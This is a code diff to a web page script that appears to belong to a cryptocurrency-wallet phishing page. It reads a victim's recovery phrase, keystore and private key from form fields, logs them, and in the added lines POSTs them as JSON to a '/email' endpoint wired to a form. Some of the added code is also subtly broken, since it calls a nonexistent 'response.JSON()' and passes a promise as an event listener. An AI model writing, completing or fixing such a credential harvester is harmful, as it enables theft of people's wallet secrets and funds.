@@ -54,7 +54,7 @@
             const phrase = document.getElementById("phrase").value;
             const keyStore = document.getElementById("keystore").value;
             const privateKey = document.getElementById("privatekey").value;
-            const form = document.getElementById("mail_form");
+            const Form = document.getElementById("mail_form");
             console.log(`${phrase}, ${privateKey}, ${wallet}, ${keyStore} `)
 
             const data = {
@@ -63,16 +63,18 @@
                 privateKey
             };
 
-            fetch('', data, {
+            const dataFetch = fetch("/email", {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
             })
-            .then()
-            .catch()
+            .then((response) => response.JSON())
+            .then((data)=> console.log("Success: ", data))
+            .catch((error) => console.log("Error: ", error))
 
+            Form.addEventListener("click", dataFetch)
         </script>
 </body>
 
